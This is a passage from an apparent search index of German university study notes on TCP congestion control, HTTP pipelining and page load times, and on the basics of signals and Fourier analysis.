<code>cwnd</code>.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#5-beobachtet-cwnd-nur-das-lokale-netz","title":"\ud83c\udf0d 5. Beobachtet <code>cwnd</code> nur das lokale Netz?","text":"<p>Nein. <code>cwnd</code> bezieht sich auf den gesamten Pfad zwischen Client und Server (Ende-zu-Ende).</p> <ul> <li>Es \u201ef\u00fchlt\u201c Staus im Netz nur \u00fcber die R\u00fcckmeldungen (ACKs)</li> <li>Es kennt keine Router oder Leitungen direkt</li> <li>Es reagiert aber auf Verluste, Verz\u00f6gerungen und Doppelte ACKs als Zeichen: \u201eIrgendwo ist es zu voll\u201c</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#6-unterschied-http-mit-und-ohne-pipelining","title":"\ud83c\udf10 6. Unterschied HTTP mit und ohne Pipelining","text":"Feature Ohne Pipelining Mit Pipelining Anfragen Eine nach der anderen Alle auf einmal Antworten Erst Antwort 1, dann 2, dann 3 Auch in Reihenfolge - aber alle Anfragen schon vorher raus Vorteil Einfach, gut steuerbar Schnellere Anfragen Nachteil Viele RTTs n\u00f6tig Head-of-Line-Blocking: Wenn eine Antwort h\u00e4ngt, h\u00e4ngen alle","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#7-beispiel-bild-wird-ubertragen-mit-tcp","title":"\ud83d\udce6 7. Beispiel: Bild wird \u00fcbertragen (mit TCP)","text":"<ol> <li>Client fragt: \u201eGib mir Bild 5\u201c</li> <li>Server schaut auf sein <code>cwnd</code> - z.\u202fB. 2 MSS \u2192 schickt 2 Segmente</li> <li>Client bekommt sie \u2192 schickt 2 ACKs</li> <li>Server empf\u00e4ngt ACKs \u2192 erh\u00f6ht <code>cwnd</code> \u2192 darf z.\u202fB. 4 Segmente schicken</li> <li>Das geht so weiter, bis das Bild komplett da ist</li> <li>Wenn alles ankam \u2192 keine neuen ACKs \u2192 Ruhe</li> </ol>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#merksatze-zum-mitnehmen","title":"\ud83d\udca5 Merks\u00e4tze zum Mitnehmen","text":"<ul> <li><code>cwnd</code> lebt beim Sender</li> <li><code>cwnd</code> = Vertrauenslevel, wie viel man schicken darf</li> <li>ACKs sind die W\u00e4hrung f\u00fcr Vertrauen</li> <li>RTT = Anfrage + Antwort</li> <li>Bei ACKs w\u00e4chst <code>cwnd</code> (Slow Start)</li> <li>Bei RTT w\u00e4chst cwnd (Congestion Avoidance)</li> <li>Kein explizites \u201ecwnd ist jetzt gr\u00f6\u00dfer\u201c-Paket - es passiert intern</li> <li>HTTP mit Pipelining = schneller, aber riskanter bei Problemen</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#kleine-ubungsaufgabe","title":"\ud83d\udca5 Kleine \u00dcbungsaufgabe","text":"Objekt Request Bytes Request Segmente Response Bytes Response Segmente HTML Code 1200 2 2000 3 Bild 1 1600 2 3200 4 Bild 2 3200 4 800 1 Bild 3 4800 6 8000 10 Bild 4 800 2 30000 38 Bild 5 1200 2 11600 15 Bild 6 - 14 800 1 8000 10 Bild 15 800 1 52000 65 Bild 16 800 1 11200 14 Bild 17 - 27 800 1 3200 4 Parameter Wert MSS 800 Bytes IW 2 MSS","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#legende-fur-folgende-beispiele","title":"\ud83d\udcdd Legende f\u00fcr folgende Beispiele:","text":"<ul> <li><code>MOReq[...]</code> = HTML Request</li> <li><code>IO1Req[...]</code> = Bild-Request 1</li> <li><code>MO:Sx-Sy</code> = Server-Antwort f\u00fcr HTML</li> <li><code>IOx:Sx-Sy</code> = Server-Antwort f\u00fcr Bild x</li> <li><code>ACK</code> = Quittung f\u00fcr empfangenes Segment</li> <li><code>cwnd</code> = Congestion Window</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#persistent-http-ohne-pipelining","title":"\ud83d\udd37 Persistent HTTP ohne Pipelining","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#regel-1-kein-pipelining-http-verhalten","title":"\ud83d\udd39 Regel 1: Kein Pipelining (HTTP-Verhalten)","text":"<ul> <li>Der Client darf nur einen Request gleichzeitig senden.</li> <li>Erst nachdem die vollst\u00e4ndige Antwort empfangen wurde, sendet er den n\u00e4chsten Request.</li> <li>Es gibt keine \u00dcberschneidung zwischen Request-Response-Zyklen.</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#regel-2-tcp-mit-slow-start","title":"\ud83d\udd39 Regel 2: TCP mit Slow Start","text":"<ul> <li>Server startet mit <code>cwnd = IW = 2 MSS</code></li> <li>Bei jedem ACK, das der Server bekommt, erh\u00f6ht sich <code>cwnd</code> um 1 MSS</li> <li>Wenn mehrere Segmente gesendet wurden, k\u00f6nnen mehrere ACKs ankommen \u2192 schnelleres Wachstum</li> </ul> RTT Tx Client cwnd Client Client (Browser) Server cwnd Server Tx Server 1 2 Segmente 2 MSS <code>MOReq[1200]</code> Empf\u00e4ngt Req, sendet ACK 2 MSS 1x ACK, 2 Segmente (HTML 0-1599) 2 2x ACK 4 MSS ACK f\u00fcr HTML-Segmente Erh\u00f6ht cwnd, sendet rest HTML 4 MSS 1 Segment (HTML 1600-1999) 3 1x ACK + 2 Segmente 5 MSS ACK + <code>IO1Req[1600]</code> Empf\u00e4ngt Req, sendet ACK 5 MSS 1x ACK, 4 Segmente (Bild 1) 4 4x ACK + 4 Segmente 11 MSS ACK + <code>IO2Req[3200]</code> Empf\u00e4ngt Req, sendet ACK 9 MSS 1x ACK, 1 Segment (Bild 2) 5 1x ACK 12 MSS ACK f\u00fcr Bild 2 Erh\u00f6ht cwnd 10 MSS - Zur Legende","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#persistent-http-mit-pipelining","title":"\ud83d\udd37 Persistent HTTP mit Pipelining","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#regel-1-pipelining-erlaubt-http-verhalten","title":"\ud83d\udd39 Regel 1: Pipelining erlaubt (HTTP-Verhalten)","text":"<ul> <li>Der Client kann mehrere Requests hintereinander senden, ohne auf Antworten zu warten.</li> <li>Die Reihenfolge der Antworten muss vom Server korrekt eingehalten werden.</li> <li>Effizienter, weil mehr RTTs parallel genutzt werden k\u00f6nnen.</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#regel-2-tcp-mit-slow-start-gleich-wie-oben","title":"\ud83d\udd39 Regel 2: TCP mit Slow Start (gleich wie oben)","text":"<ul> <li><code>cwnd</code> beginnt mit 2 MSS</li> <li>Bei jedem ACK w\u00e4chst <code>cwnd</code> um 1 MSS (solange keine Verluste auftreten)(Slow Start)</li> <li>Server nutzt <code>cwnd</code>, um mehrere Segmente gleichzeitig zu senden</li> </ul> RTT Tx Client cwnd Client Client (Browser) Server cwnd Server Tx Server 1 2 Segmente 2 MSS <code>MOReq[1200]</code> Empf\u00e4ngt Req, sendet ACK 2 MSS 1x ACK, 2 Segmente (HTML) 2 2x ACK + 8 Segmente 4 MSS ACK + <code>IO1-IO3Req</code> Empf\u00e4ngt Req, sendet 3x ACK 4 MSS 3x ACK, 3 Segmente (HTML Ende + Bild 1) 3 - 4 MSS - Erh\u00f6ht cwnd, sendet rest Bild 1 5 MSS 1 Segment (Bild 1) 4 4x ACK 8 MSS ACK f\u00fcr Bild 1 Erh\u00f6ht cwnd, sendet Bild 2 9 MSS 1 Segment (Bild 2) 5 1x ACK 9 MSS ACK f\u00fcr Bild 2 Erh\u00f6ht cwnd, sendet Bild 3 10 MSS 10 Segmente (Bild 3) Zur Legende","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#was-passiert-bei-paketverlust-gilt-fur-beide-falle","title":"\ud83d\udd36 Was passiert bei Paketverlust? (gilt f\u00fcr beide F\u00e4lle)","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#regel-3-verlusterkennung-reaktion","title":"\ud83d\udcc9 Regel 3: Verlusterkennung &amp; Reaktion","text":"<ul> <li>Wenn ein Segment verloren geht, merkt der Client das daran, dass er mehrmals denselben ACK sendet</li> <li> <p>Der Server erkennt den Verlust bei:</p> <ul> <li>3 doppelten ACKs \u2192 Fast Retransmit: Er sendet das verlorene Segment sofort nochmal</li> <li>Dann: Reduktion des cwnd<ul> <li>z.\u202fB. <code>cwnd = cwnd / 2</code></li> <li>Wechsel in den Congestion Avoidance-Modus</li> </ul> </li> </ul> <p>Beispiel: Stell dir vor, der Server sendet: </p><pre><code>Segment 0 (Bytes 0-799) \u2705\nSegment 1 (Bytes 800-1599) \u2705\nSegment 2 (Bytes 1600-2399) \u274c \u2190 dieses geht verloren\nSegment 3 (Bytes 2400-3199) \u2705\n</code></pre><p></p> </li> </ul> <p>Der Client bekommt: - Segment 0 \u2192 sendet <code>ACK 800</code> - Segment 1 \u2192 sendet <code>ACK 1600</code> - \u274c Segment 2 fehlt \u2192 Client wartet auf 1600-2399 - Dann kommt Segment 3 (Bytes 2400-3199), aber Segment 2 fehlt noch!</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#jetzt-passierts","title":"\ud83d\udce3 Jetzt passiert's:","text":"<p>Der Client kann Segment 3 nicht verwenden, solange Segment 2 fehlt. \u2192 Also schickt er nochmal einen ACK f\u00fcr 1600 \u2192 und nochmal... \u2192 und nochmal...</p> <p>\ud83d\udccc Diese doppelten ACKs f\u00fcr denselben Bytewert nennt man Duplicate ACKs.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#wann-reagiert-der-server","title":"\ud83d\udea8 Wann reagiert der Server?","text":"<p>Wenn der Server drei Duplicate ACKs f\u00fcr denselben Wert sieht (z.\u202fB. 3\u00d7 <code>ACK 1600</code>), dann: - erkennt er, dass Segment 2 fehlt - \u2192 Fast Retransmit: er sendet Segment 2 sofort erneut - \u2192 Reduziert sein cwnd (h\u00e4ufig auf die H\u00e4lfte)</p> <ul> <li>Bild 5<ul> <li>Request: 1200 Bytes \u2192 2 Segmente</li> <li>Response: 11600 Bytes \u2192 15 Segmente</li> </ul> </li> <li>MSS = 800 Bytes</li> <li>Wir nehmen an: Segment 7 (Bytes <code>5600-6399</code>) geht verloren</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#beispiel-paketverlust-bei-bild-5-segment-7-fehlt","title":"\ud83d\udce6 Beispiel: Paketverlust bei Bild 5 (Segment 7 fehlt)","text":"RTT Tx Client cwnd Client Client (Browser) Server cwnd Server Tx Server 1 <code>IO5Req[1200]</code> (2 Segmente) z.\u202fB. 20 MSS sendet Bild-Request empf\u00e4ngt Request, sendet ACK z.\u202fB. 50 MSS 1x ACK, sendet 15 Segmente (Bild 5) ... \u274c Segment 7 (Byte 5600-6399) fehlt 2 1x DUP ACK (f\u00fcr Segment 6) 20 MSS empf\u00e4ngt Segment 6 - 50 MSS - 3 1x DUP-ACK (f\u00fcr Segment 6) 20 MSS empf\u00e4ngt Segment 6 - 50 MSS - 4 1x DUP-ACK (f\u00fcr Segment 6) 20 MSS empf\u00e4ngt Segment 2 \ud83d\udd01 Fast Retransmit wird ausgel\u00f6st 50 MSS Retransmit Segment 7 5 1x ACK 21 MSS empf\u00e4ngt fehlendes Segment \u2192 komplett erh\u00f6ht cwnd 51 MSS - <p>Zur Legende</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/","title":"3. TCP   Congestion Control","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#1-grundlagen-tcp-congestion-control","title":"\ud83d\udd39 1. Grundlagen: TCP Congestion Control","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#wichtige-definitionen","title":"Wichtige Definitionen:","text":"Begriff Erkl\u00e4rung ACK-Ankunft (An) Best\u00e4tigt den Empfang aller Segmente bis einschlie\u00dflich <code>n</code>. FlightSize 1 Anzahl noch nicht best\u00e4tigter Pakete nach Empfang der ACKs. FlightSize 2 Anzahl unbest\u00e4tigter Pakete nach dem Senden neuer Segmente. DupACKs Anzahl identischer ACKs, die darauf hinweisen, dass ein Paket fehlt. ssthresh Schwelle zwischen Slow Start und Congestion Avoidance. cwnd Gr\u00f6\u00dfe des Congestion Window (in Segmenten). Gesendete Segmente (Sn) Welche neuen Datenpakete verschickt wurden. CA-Segment Segment, das in der Congestion Avoidance Phase verwendet wird, um den Fortschritt zu markieren. TCP (Transmission Control Protocol) ist ein verbindungsorientiertes Protokoll, das Mechanismen zur Flusskontrolle und \u00dcberlastkontrolle (Congestion Control) verwendet. Die wichtigsten Phasen der TCP Congestion Control sind: ## \ud83d\udd38 1. Slow Start (langsamer Start, aber schnelles Wachstum)","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#was-ist-das","title":"\u2753Was ist das?","text":"<p>Die Slow Start-Phase ist die erste Phase im TCP Congestion Control-Mechanismus. Obwohl der Name \"slow\" klingt, w\u00e4chst das Fenster hier exponentiell schnell.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#wie-funktioniert-das","title":"\u2699\ufe0f Wie funktioniert das?","text":"<ul> <li>TCP startet mit einem kleinen Congestion Window (cwnd), z.\u202fB. 1 oder 3 Segmenten. In deiner Aufgabe: <code>cwnd = 3</code>.</li> <li>Jedes Mal, wenn ein vollst\u00e4ndiges Segment durch ein ACK best\u00e4tigt wird, wird <code>cwnd</code> um 1 erh\u00f6ht pro ACK \u2192 weil jedes ACK einen Hinweis gibt, dass die Verbindung stabil ist.</li> <li>Da mehrere ACKs in einem RTT eintreffen, verdoppelt sich cwnd pro RTT (exponentielles Wachstum):</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#beispiel","title":"\ud83d\udcc8 Beispiel:","text":"RTT Gesendete Segmente empfangene ACKs neuer cwnd 1 S1, S2, S3 ACK 4 6 2 S4-S9 ACK 10 12 3 S10-S21 ACK 21 ... <p>FlightSize = die Anzahl der gesendeten, aber noch nicht best\u00e4tigten Segmente.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#2-ssthresh-slow-start-threshold-schwellenwert","title":"\ud83d\udd38 2. ssthresh (Slow Start Threshold - Schwellenwert)","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#was-ist-das_1","title":"\u2753Was ist das?","text":"<p><code>s\u200dsthresh</code> ist der Schwellenwert, der zwischen Slow Start und Congestion Avoidance entscheidet.</p> <ul> <li>Initial: <code>ssthresh = \u221e</code> (also kein \u00dcbergang \u2192 Start in Slow Start).</li> <li>Wenn ein Verlust erkannt wird, wird <code>ssthresh</code> gesetzt auf die H\u00e4lfte von <code>cwnd</code>.</li> <li>Danach: Wenn <code>cwnd &gt;= ssthresh</code>, dann wechselt TCP zur Congestion Avoidance.</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#beispiel_1","title":"\ud83d\udd01 Beispiel:","text":"<ul> <li><code>cwnd = 3</code>, <code>ssthresh = \u221e</code> \u2192 TCP bleibt in Slow Start.</li> <li>Nach Verlust (z.\u202fB. Timeout), <code>ssthresh = \u2192 1</code></li> <li>Dann beginnt TCP bei <code>cwnd = 1</code>, w\u00e4chst wieder.</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#3-congestion-avoidance-stauvermeidung","title":"\ud83d\udd38 3. Congestion Avoidance (Stauvermeidung)","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#was-ist-das_2","title":"\u2753Was ist das?","text":"<p>In dieser Phase ist TCP vorsichtiger - kein exponentielles Wachstum mehr, sondern lineares Wachstum.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#wie-funktioniert-das_1","title":"\u2699\ufe0f Wie funktioniert das?","text":"<ul> <li>Pro vollst\u00e4ndigem RTT erh\u00f6ht sich <code>cwnd</code> nur um 1 Segment.</li> <li>Motivation: Verbindung stabilisieren, ohne das Netz zu \u00fcberlasten.</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#beispiel_2","title":"\ud83d\udcc8 Beispiel:","text":"RTT cwnd vor ACK ACKs erhalten cwnd danach 5 10 ACKs f\u00fcr alle 11 6 11 ACKs 12 <p>Man spricht hier von \u201eAdditive Increase\u201c.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#4-verlust-erkennung-in-tcp","title":"\ud83d\udd38 4. Verlust-Erkennung in TCP","text":"<p>TCP erkennt Verluste nicht direkt, sondern indirekt \u00fcber das Verhalten der ACKs. - Kein ACK (auch keine DupACKs) \u2192 Timeout \u2192 cwnd wird zur\u00fcckgesetzt \u2192 R\u00fcckkehr in Slow Start     - Erkennt Timeout nach 10 RTT</p> <ul> <li>3x DupACK \u2192 Paketverlust vermutet \u2192 Fast Retransmit + Fast Recovery \u2192 \u00dcbergang in Congestion Avoidance (kein Neustart)<ul> <li>Erkennt Package Loss wegen DUP ACK</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#a-triple-duplicate-acks-schnelles-eingreifen","title":"\ud83d\uded1 (a) Triple Duplicate ACKs - schnelles Eingreifen","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#was-ist-das_3","title":"\u2753Was ist das?","text":"<p>Wenn ein Segment fehlt, aber darauffolgende Segmente ankommen, sendet der Empf\u00e4nger wiederholt denselben ACK (weil das letzte korrekt empfangene Segment noch nicht komplett best\u00e4tigt wurde).</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#was-passiert","title":"\u2699\ufe0f Was passiert?","text":"<ul> <li>Nach 3 gleichen (Duplikat-)ACKs \u2192 Fast Retransmit: Das vermisste Segment wird sofort neu gesendet.</li> <li>TCP vermutet: Netz ist leicht \u00fcberlastet \u2192 reagiert moderat:</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#regel","title":"\ud83d\udccc Regel:","text":"<ul> <li><code>ssthresh = cwnd / 2</code></li> <li><code>cwnd = ssthresh + 3</code> \u2192 \u201eFast Recovery\u201c</li> <li>Dann geht es in Congestion Avoidance \u00fcber (nicht zur\u00fcck zu Slow Start).</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#beispiel_3","title":"\ud83d\udce6 Beispiel:","text":"<ol> <li>S1-S6 werden gesendet.</li> <li>S3 geht verloren.</li> <li>Empf\u00e4nger erh\u00e4lt S4-S6, aber hat S3 nicht \u2192 sendet 3x <code>ACK3</code>.</li> <li>Sender sieht 3 DupACKs \u2192 Fast Retransmit von S3.</li> <li>Setzt: <code>ssthresh = cwnd / 2</code>, <code>cwnd = ssthresh + 3</code></li> </ol>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#b-timeout-retransmission-timeout-harter-verlust","title":"\u23f1\ufe0f (b) Timeout (Retransmission Timeout - harter Verlust)","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#was-ist-das_4","title":"\u2753Was ist das?","text":"<p>Wenn ein ACK gar nicht ankommt (auch kein Duplicate ACK), nimmt TCP an: Segment ging verloren UND kein Folgepaket kam durch.</p> <p>Das ist schlimmer als 3 DupACKs.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#was-passiert_1","title":"\u2699\ufe0f Was passiert?","text":"<ul> <li>Nach 10 RTTs ohne ACK \u2192 Timeout.</li> <li>TCP geht davon aus: starke \u00dcberlast.</li> <li>Reaktion: aggressiv reduzieren</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#regel_1","title":"\ud83d\udccc Regel:","text":"<ul> <li><code>ssthresh = cwnd / 2</code></li> <li><code>cwnd = 1</code> \u2192 zur\u00fcck zu Slow Start</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#beispiel_4","title":"\ud83d\udce6 Beispiel:","text":"<ol> <li>cwnd = 8 \u2192 S1-S8 gesendet.</li> <li>S5, S6, S7 verloren \u2192 kein ACK mehr.</li> <li>Nach 10 RTTs \u2192 Timeout</li> <li> <p>Reaktion:</p> <ul> <li><code>ssthresh = 8 / 2 = 4</code></li> <li><code>cwnd = 1</code></li> </ul> </li> <li> <p>TCP beginnt erneut mit Slow Start (exponentielles Wachstum ab 1).</p> </li> </ol> <p>\ud83d\udfe2 Aber: Die Verbindung bleibt offen - TCP versucht weiter, die bestehende Verbindung aufrechtzuerhalten.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#2-wann-wird-die-verbindung-endgultig-beendet","title":"\ud83d\uded1 2. Wann wird die Verbindung endg\u00fcltig beendet?","text":"<p>TCP hat keine harte Regel wie \u201e1 Timeout \u2192 Verbindung tot\u201c. ABER: Wenn mehrere aufeinanderfolgende Timeouts passieren und auch dann keine Reaktion vom Empf\u00e4nger kommt, wird die Verbindung irgendwann abgebrochen.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#dafur-gibt-es-sogenannte","title":"\u2699\ufe0f Daf\u00fcr gibt es sogenannte:","text":"<ul> <li>Max Retransmission Count oder</li> <li>Maximum Segment Lifetime (MSL) oder</li> <li>Keepalive-Zeiten (optional)</li> </ul> <p>Wenn diese Schwellen \u00fcberschritten sind \u2192 TCP schlie\u00dft die Verbindung mit einem Reset (RST) oder Timeout-Abbruch.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/3.%20TCP%20-%20Congestion%20Control/#was-passiert-bei-3-dupacks-schritt-fur-schritt","title":"\u2699\ufe0f Was passiert bei 3 DupACKs - Schritt f\u00fcr Schritt","text":"Schritt Erkl\u00e4rung 1 TCP empf\u00e4ngt 3 DupACKs f\u00fcr z.\u202fB. ACK 3 2 Fast Retransmit: TCP sendet verlorenes Segment neu (z.\u202fB. S3) 3 Fast Recovery beginnt:\u2192 <code>ssthresh = cwnd / 2</code>\u2192 <code>cwnd = ssthresh + 3</code> 4 F\u00fcr weitere DupACKs (z.\u202fB. ACK3, ACK3, \u2026): <code>cwnd += 1</code> pro DupACK (nur wenn sie kommen!) 5 Wenn ein echtes ACK die L\u00fccke schlie\u00dft (z.\u202fB. ACK6):\u2192 <code>cwnd = ssthresh</code>\u2192 TCP geht in Congestion Avoidance <p>\ud83d\udccc Wichtig: Fast Retransmit + Fast Recovery geh\u00f6ren immer zusammen \u2192 \"Fast Retransmit\" ist die Aktion (sende Paket neu), \"Fast Recovery\" ist die Reaktion (Fenster neu berechnen)</p> Ereignis Verhalten 3 DupACKs Fast Retransmit + Fast Recovery \u2192 bleib in Congestion Avoidance Timeout <code>ssthresh = cwnd / 2</code>, <code>cwnd = 1</code> \u2192 zur\u00fcck zu Slow Start","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/","title":"1. Grundlagen","text":"","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#grundlagen-von-signalen-sensoren-und-systemen","title":"Grundlagen von Signalen, Sensoren und Systemen","text":"<p>Diese drei Begriffe sind die Basis f\u00fcr dein Fach:</p> <ul> <li>Signale sind physikalische Gr\u00f6\u00dfen, die Informationen transportieren (z. B. Spannung, Strom, Schall, Temperatur).</li> <li>Sensoren sind Bauelemente, die physikalische Gr\u00f6\u00dfen in elektrische Signale umwandeln (z. B. Mikrofon, Thermoelement).</li> <li>Systeme verarbeiten Signale und k\u00f6nnen sie ver\u00e4ndern, filtern oder analysieren (z. B. Verst\u00e4rker, Filter, Algorithmen zur Sprachverarbeitung).</li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#1-eigenschaften-von-signalen","title":"1. Eigenschaften von Signalen","text":"","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#11-klassifikation-von-signalen","title":"1.1 Klassifikation von Signalen","text":"<ul> <li> <p>Analog vs. Digital</p> <ul> <li>Analoge Signale sind kontinuierlich (z. B. Temperaturverlauf).</li> <li>Digitale Signale haben diskrete Werte (z. B. Bin\u00e4rsignale 0 und 1).</li> <li> <p>Deterministisch vs. Stochastisch</p> </li> <li> <p>Deterministische Signale sind vorhersehbar (z. B. Sinusschwingung).</p> </li> <li>Stochastische Signale enthalten Zufallsanteile (z. B. Rauschen).</li> <li> <p>Periodisch vs. Aperiodisch</p> </li> <li> <p>Periodische Signale wiederholen sich in regelm\u00e4\u00dfigen Abst\u00e4nden.</p> </li> <li>Aperiodische Signale tun das nicht.</li> <li> <p>Energie- vs. Leistungssignale</p> </li> <li> <p>Energiesignal: Die gesamte Energie ist endlich (z. B. kurzer Impuls).</p> </li> <li>Leistungssignal: Die Leistung bleibt konstant \u00fcber die Zeit (z. B. Sinus).</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#12-zeitbereichsanalyse","title":"1.2 Zeitbereichsanalyse","text":"<ul> <li>Signale werden meist als Funktion der Zeit dargestellt: x(t)</li> <li>Wichtige Eigenschaften:<ul> <li>Symmetrie:<ul> <li>Gerades Signal: \\(x(-t) = x(t)\\) (z. B. Kosinusfunktion)</li> <li>Ungerades Signal: \\(x(-t) = -x(t)\\) (z. B. Sinusfunktion)</li> </ul> </li> <li>Faltung (Convolution):<ul> <li>Erm\u00f6glicht die Berechnung des Systemverhaltens mit  $$ (x * h)(t) = \\int_{-\\infty}^{\\infty} x(\\tau) \\cdot h(t - \\tau) \\, d\\tau $$</li> </ul> </li> <li>Delta-Impuls \u03b4(t)\\delta(t)\u03b4(t):<ul> <li>Idealisierte Funktion, die unendlich schmal ist, aber Fl\u00e4che 1 besitzt.</li> <li>Erf\u00fcllt die \"Ausblendeeigenschaft\":   $$ \\int_{-\\infty}^{\\infty} f(t) \\cdot \\delta(t - t_0) \\, dt = f(t_0) $$</li> </ul> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#2-fourier-analyse","title":"2. Fourier-Analyse","text":"<p>Fourier-Methoden sind essenziell f\u00fcr die Analyse von Signalen, besonders in der Klausur.</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#21-fourierreihe-periodische-signale","title":"2.1 Fourierreihe (Periodische Signale)","text":"<ul> <li>Ein periodisches Signal kann als Summe von Sinus- und Kosinusfunktionen dargestellt werden:  $$ x(t) = a_0 + \\sum_{n=1}^{\\infty} \\left( a_n \\cos(n \\omega_0 t) + b_n \\sin(n \\omega_0 t) \\right) $$</li> </ul> \\[ \\omega_0 = \\frac{2\\pi}{T} \\]","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#22-fourier-transformation-aperiodische-signale","title":"2.2 Fourier-Transformation (Aperiodische Signale)","text":"<ul> <li> <p>Wandelt ein Zeitsignal in den Frequenzbereich um:</p> \\[ X(f) = \\int_{-\\infty}^{\\infty} x(t) \\cdot e^{-j 2 \\pi f t} \\, dt \\] <p>% Umkehrtransformation: $$ x(t) = \\int_{-\\infty}^{\\infty} X(f) \\cdot e^{j 2 \\pi f t} \\, df $$ - Erm\u00f6glicht die Analyse von Frequenzanteilen in einem Signal. - Wichtige Eigenschaft: Die Umkehrtransformation bringt uns zur\u00fcck ins Zeitdomain. - Eigenschaften der Fourier-Transformation:</p> <ul> <li> <p>Linearit\u00e4t: $$ \\mathcal{F} { a x_1(t) + b x_2(t) } = a X_1(f) + b X_2(f) $$</p> </li> <li> <p>Verschiebung im Zeitbereich: $$ \\mathcal{F} { x(t - t_0) } = e^{-j 2 \\pi f t_0} \\cdot X(f) $$</p> </li> <li> <p>Faltungssatz: $$ \\mathcal{F} { x_1(t) * x_2(t) } = X_1(f) \\cdot X_2(f) $$</p> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#23-diskrete-fourier-transformation-dft","title":"2.3 Diskrete Fourier-Transformation 